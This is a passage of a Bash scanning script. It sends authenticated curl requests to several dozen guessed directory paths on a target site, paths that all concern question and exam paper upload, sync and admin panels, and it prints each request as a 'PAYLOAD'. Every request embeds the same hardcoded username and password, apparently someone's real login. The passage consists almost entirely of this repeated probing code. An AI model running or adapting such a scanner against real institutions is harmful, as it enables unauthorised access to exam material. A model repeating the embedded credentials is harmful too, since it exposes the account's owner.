" "${target}FileUpload_QPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}FileUpload_QPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPDatabaseDataOps/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPDatabaseDataOps/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPDatabaseDataOps/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchUpload-QPManager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchUpload-QPManager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchUpload-QPManager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload-BatchProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload-BatchProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload-BatchProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPWorkflow-Manager/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPWorkflow-Manager/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPWorkflow-Manager/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync_Q_P/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync_Q_P/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync_Q_P/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBDataUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBDataUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBDataUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringTool-ExamPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringTool-ExamPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringTool-ExamPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Management_QPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Management_QPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Management_QPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoUploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoUploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoUploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBatch-Panel/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBatch-Panel/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBatch-Panel/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Q_P-BatchUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Q_P-BatchUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Q_P-BatchUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Mgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulk_Mgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulk_Mgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [MonitoringToolQsnPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}MonitoringToolQsnPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}MonitoringToolQsnPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Monitoring_QPMgmt/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Monitoring_QPMgmt/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Monitoring_QPMgmt/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [UploadService_QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}UploadService_QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}UploadService_QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService-Control/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService-Control/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService-Control/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataPipeline-QuestionPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataPipeline-QuestionPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataPipeline-QuestionPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulkDataSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPBulkDataSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPBulkDataSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader_FileProcessor/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader_FileProcessor/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader_FileProcessor/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Module_QPService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Module_QPService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Module_QPService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-Automation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-Automation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-Automation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataOps_QPControl/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataOps_QPControl/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataOps_QPControl/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPManagerAutomation/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPManagerAutomation/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPManagerAutomation/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPAutoDataPipeline/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPAutoDataPipeline/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPAutoDataPipeline/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ModuleQPHandler/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ModuleQPHandler/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ModuleQPHandler/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AutoUploadQPaper/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AutoUploadQPaper/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AutoUploadQPaper/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Sync_QPBatch/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Sync_QPBatch/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Sync_QPBatch/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [Dashboard_QPAuto/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}Dashboard_QPAuto/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}Dashboard_QPAuto/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPService_DataSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPService_DataSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPService_DataSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUploader-Monitoring/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUploader-Monitoring/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUploader-Monitoring/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPControl-UploadService/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPControl-UploadService/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPControl-UploadService/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ServiceQPSystem/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ServiceQPSystem/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ServiceQPSystem/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QstnPaperCloudSync/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QstnPaperCloudSync/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QstnPaperCloudSync/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPUpload_Suite/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPUpload_Suite/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPUpload_Suite/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [DataSync-QPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}DataSync-QPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}DataSync-QPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPB-AutoUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPB-AutoUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPB-AutoUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [AdminQPProcessing/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}AdminQPProcessing/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}AdminQPProcessing/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [ExamPaper_BulkUpload/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}ExamPaper_BulkUpload/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}ExamPaper_BulkUpload/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPFile_Monitoring/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}QPFile_Monitoring/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}QPFile_Monitoring/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [BatchProcessor_QPAdmin/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
" "${target}BatchProcessor_QPAdmin/" -H "User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_13_0) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/65.0.3325.162 Safari/537.36" -u "21104131005:Anjali@05")
payload=$(printf "╭$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╮
${cyan} ╰─> PAYLOAD${end} : ${green}curl -k -s "${target}BatchProcessor_QPAdmin/" -H "User-Agent: Mozilla/5.0" -u "21104131005:Anjali@05"
${end}╰$(printf "%.0s─" $(seq "$((`tput cols` - 2))"))╯
")
print
echo -n "Payload [QPBulk_Control/]:"
code=$(curl -k -s --max-redirs 0 -o /dev/null -i -w "Status: %{http_code}, Length : %{size_download}
